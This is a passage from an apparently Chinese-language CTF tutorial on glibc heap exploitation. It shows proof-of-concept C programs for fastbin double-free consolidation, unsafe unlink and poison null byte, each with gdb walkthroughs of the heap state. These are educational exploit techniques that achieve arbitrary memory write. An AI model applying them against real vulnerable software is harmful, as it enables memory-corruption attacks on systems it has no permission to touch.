class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocating a tcache-sized chunk (p3=%p)\n&quot;</span>, p3);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;will trigger the malloc_consolidate and merge\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the fastbin chunks into the top chunk, thus\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;p1 and p3 are now pointing to the same chunk !\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p1 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Triggering the double free vulnerability!\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(p4 == p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The double free added the chunk referenced by p1 \n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;to the tcache thus the next similar-size malloc will\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;point to p3: p3=%p, p4=%p\n\n&quot;</span>,p3, p4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用pwncli改写rpath。
</code></pre>
<h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>calloc p1堆块后，在0x4006C5处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KQEQ32B3NMRVFSC.png"
                      alt="图片描述"
                ><br>查看堆结构， 可以看到多出来一块0x411大小的堆块。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4PVC2FBRWP9GF7A.png"
                      alt="图片描述"
                ><br>这个堆块是puts的缓冲区。puts函数用于将字符串输出到标准输出流（stdout），而标准输出流是一个文件流，需要在内存中分配一块缓冲区来存储输出的字符串，下图是其分配过程。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XG85YQF9NY28T7S.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6QS2Z3FCJEQPXMR.png"
                      alt="图片描述"
                ><br>free(p1)后，p1会优先进入fastbins。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_YG6FJ2KF3VB4U26.png"
                      alt="图片描述"
                ><br>再次申请0x400（实际大小为0x410）的chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_Y7DJTKGEFQFGFGA.png"
                      alt="图片描述"
                ><br>在gdb里s步入调试，可以看到触发了malloc_consolidate机制。原因如下，因为libc再分配large chunk时，fastbin中有p1这个chunk存在，所以会调用malloc_consolidate()函数整合fastbins中的chunk，并放入unsorted bin或top_chunk;然后unsorted bin中的chunk又会被取出放入各自对应的bins。(这个bins为small bin和large bin。这也是chunk唯一进入small bin和large bin的机会)。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VXYWCAM8E85E5V6.png"
                      alt="图片描述"
                ><br>malloc_consolidate()函数执行完以后，因为p1与top_chunk相邻，所以p1被合并到了top_chunk。top_chunk的基址也变成了p1的prev_size的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6AUFTSRX2JMSNHZ.png"
                      alt="图片描述"
                ><br>然后malloc函数会从top_chunk获取chunk，那么p1的地址就已经和p3指向同一块地址了。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R2MJEDKJDC62ZD.png"
                      alt="图片描述"
                ><br>此时再次free(p1)，在0x40076c处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3UFBHGTKF3NW24D.png"
                      alt="图片描述"
                ><br>由于p1和p3指向同一个大小为0x411的chunk,而这个chunk又和top_chunk相邻，所以会再次被合并到top_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_K9CV7KXXVU9UMNW.png"
                      alt="图片描述"
                ><br>如果这个时候，我们再次申请一个chunk，在0x40077A处下断点。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_38SFMRQ5X3FR7A5.png"
                      alt="图片描述"
                ><br>那么这个chunk的地址还会与p1 &amp;&amp; p3的地址一样。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4AUY3TB9B4HUMEM.png"
                      alt="图片描述"
                ><br>至此p1,p3,p4指向了同一块chunk。</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to unsafe unlink 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 14.04/16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_ptr  = (<span class="type">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We create a fake chunk inside chunk0.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;next_free_chunk&#x27; (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We setup the &#x27;previous_free_chunk&#x27; (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) &amp;chunk0_ptr-(<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>,(<span class="type">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We shrink the size of chunk0 (saved as &#x27;previous_size&#x27; in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It&#x27;s important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n&quot;</span>,(<span class="type">void</span>*)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We mark our fake chunk as free by setting &#x27;previous_in_use&#x27; of chunk1 as False.\n\n&quot;</span>);</span><br><span class="line">	chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n&quot;</span>);</span><br><span class="line">	<span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(victim_string,<span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>) victim_string;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>,victim_string);</span><br><span class="line">	chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>,victim_string);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// sanity check</span></span><br><span class="line">	<span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>当然，其实chunk0_ptr并不一定是一个全局指针。以下代码在glibc2.23依然起作用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> malloc_size = <span class="number">0x80</span>;</span><br><span class="line">	<span class="type">uint64_t</span>* ptr0 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	<span class="type">uint64_t</span>* ptr1 = (<span class="type">uint64_t</span>*)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">	ptr0[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">3</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr0[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;ptr0 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"> </span><br><span class="line">	<span class="type">uint64_t</span>* ptr1_head = (<span class="type">uint64_t</span>)ptr1 - <span class="number">2</span>*<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line">	ptr1_head[<span class="number">0</span>] = malloc_size;</span><br><span class="line">	ptr1_head[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">free</span>(ptr1);</span><br><span class="line">	<span class="type">char</span> victim[<span class="number">10</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	ptr0[<span class="number">3</span>]=(<span class="type">uint64_t</span>)victim;</span><br><span class="line">	ptr0[<span class="number">0</span>] = <span class="number">0x4141414141</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,victim);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<pre><code>使用ubuntu:16.04编译并使用第一个源码pwncli改写rpath。
</code></pre>
<p>   简单介绍一下unlink，<a class="link"   href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/" >CTF Wiki <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>里有介绍，简单总结如下：</p>
<pre><code>1，首先找到要进行unlink的chunk(这里记为P)的前后堆块，
   FD = P-&gt;fd, BK = P-&gt;bk。
2，进行安全检查，glibc2.23的潦草判断条件如下
   FD-&gt;bk == P, BK-&gt;fd == P。
3，然后执行FD-&gt;bk=BK, BK-&gt;fd=FD。
4，当某个non-fast大小的chunk被释放时，就会根据PREV_INUSE位检查其前后堆块是否处于释放状态，如果是就会将前面或后面的堆块取出并与当前堆块合并。取出前面或后面的堆块P的过程就是unlink。
</code></pre>
<h3 id="调试-6"><a href="#调试-6" class="headerlink" title="调试"></a>调试</h3><p>首先申请两块smallbin_chunk。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_6ZP8PYCJCE35KDG.png"
                      alt="图片描述"
                ><br>为了绕过unlink检查，这里将全局的chunk0_ptr+0x10(chunk0_ptr[2])处的内容改为chunk0_ptr-0x18的地址，注意这里chunk0_ptr[2]指向的是全局变量的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_XTHTCK8EQSMAX6B.png"
                      alt="图片描述"
                ><br>同样，接下来将chunk0_ptr[3]的内容改为chunk0_ptr-0x10的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2GFDGPT8AB5TCPM.png"
                      alt="图片描述"
                ><br>chunk0_ptr位置在bss节。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_2QDW7TADTJ8F9YD.png"
                      alt="图片描述"
                ></p>
<p>此时chunk0的堆结构。可以看到chunk0_ptr指向chunk0_fd(0x603010)的位置。chunk0_fd_nextsize和chunk0_bk_nextsize已被修改为全局变量（bss节）处的地址。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_T7ZZAKUECF646WZ.png"
                      alt="图片描述"
                ><br>用图来表示如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NXQ9YXPN542KB5K.png"
                      alt="图片描述"
                ></p>
<p>接下来cdqe指令将EAX寄存器中的DWORD(32 位值)符号扩展为RAX寄存器中的 QWORD(64 位值)。然后利用shl指令逻辑左移三位，再利用neg指令求补。最后也就是将chunk1_hdr的内容改为chunk1_ptr-2（chunk1_prev_size）的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JG8ZQB8MH2YV68Q.png"
                      alt="图片描述"
                ></p>
<p>接下来将chunk1_hdr[0]改为0x80大小，也就是chunk1的prev_size位变为0x80。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_JN69YNASY7MKFCK.png"
                      alt="图片描述"
                ></p>
<p>然后利用and指令（与运算有零则零）把chunk1_hdr+1也就是chunk1_size的PREV_INUSE位改为0。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_BGBDQAVWY7R26XR.png"
                      alt="图片描述"
                ></p>
<p>现在堆结构如图。因为chunk_prev_size&#x3D;0x80,所以P_chunk如下<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PZ9JU3KFW6NJN5P.png"
                      alt="图片描述"
                ></p>
<p>然后把chunk1给free()掉因为其PREV_INUSE为0，又是small bin大小，触发unlink，要将P这个fake chunk摘除。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VY24BDSZW5SQSWA.png"
                      alt="图片描述"
                ><br>那么此时FD&#x3D;P-&gt;FD和BK&#x3D;P-&gt;bk，FD-&gt;bk &#x3D;&#x3D; P, BK-&gt;fd &#x3D;&#x3D; P。可以能够看到成功绕过glibc2.23检查。注意，我画的时候是根据布局画的，堆由低向高地址增长（由高向低画），bss由低向高画的。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3KAA3VZEGWRQ2CF.png"
                      alt="图片描述"
                ></p>
<p>接下来执行 两步操作 FD-&gt;bk&#x3D;BK, BK-&gt;fd&#x3D;FD。FD和BK只相差0x8字节大小。第一步会把chunk0_ptr指向低0x10字节处（0x602068），第二步把chunk0_ptr指向低0x18字节处（0x602060），最终chunk0_ptr指向了0x602060处。chunk0_ptr &#x3D; 0x602060，我们向chunk0_ptr写入内容时就会从0x602060开始向高地址写，我们发现，写到高0x18时，写到了我们保存写入地址指针的地址，这个地址(chunk0_ptr的物理地址0x602078)存储的地址(0x602060)就是我们开始写的地址，也就是chunk0_ptr指向的地址。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_3G6W8HPTPJYVXXM.png"
                      alt="图片描述"
                ><br>可以看到，<code>chunk0_ptr</code>指向的地址由<code>*chunk0_ptr-0x18</code>保存，修改<code>*chunk0_ptr-0x18</code>存储的地址(0x602060)，也就修改了写入的起始地址，也就是chunk0_ptr指向的地址，我们会从这个新地址重新开始写，也就达到了任意地址写的效果。这只是其中一种用法，建议看例题来加深理解。<br>  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_4A4TPGFMMJSRUCR.png"
                      alt="图片描述"
                ><br>我们也可以通过从0x602060开始向高地址覆盖，覆盖到0x602078处时，修改这里保存的地址，然后下次写时就会从修改的这个新地址开始写入。</p>
<h1 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h1><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><ul>
<li><p>off-by-one<br><a class="link"   href="https://www.52pojie.cn/thread-1825637-1-1.html" >ASIS CTF 2016 : b00ks <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828172-1-1.html" >Plaid CTF 2015 : PlaidDB <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1828388-1-1.html" >SECCON CTF 2016 : tinypad <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.52pojie.cn/thread-1836790-1-1.html" >BCTF 2016 : bcloud <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>overlapping chunk<br><a class="link"   href="https://www.52pojie.cn/thread-1833414-1-1.html" >0CTF 2018 : babyheap <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.52pojie.cn/thread-1833578-1-1.html" >hack.lu CTF 2015 : bookstore <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
</ul>
<h2 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h2><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* a;</span><br><span class="line">	<span class="type">uint8_t</span>* b;</span><br><span class="line">	<span class="type">uint8_t</span>* c;</span><br><span class="line">	<span class="type">uint8_t</span>* b1;</span><br><span class="line">	<span class="type">uint8_t</span>* b2;</span><br><span class="line">	<span class="type">uint8_t</span>* d;</span><br><span class="line">	<span class="type">void</span> *barrier;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);</span><br><span class="line">	a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line">	<span class="type">int</span> real_a_size = <span class="built_in">malloc_usable_size</span>(a);</span><br><span class="line">	<span 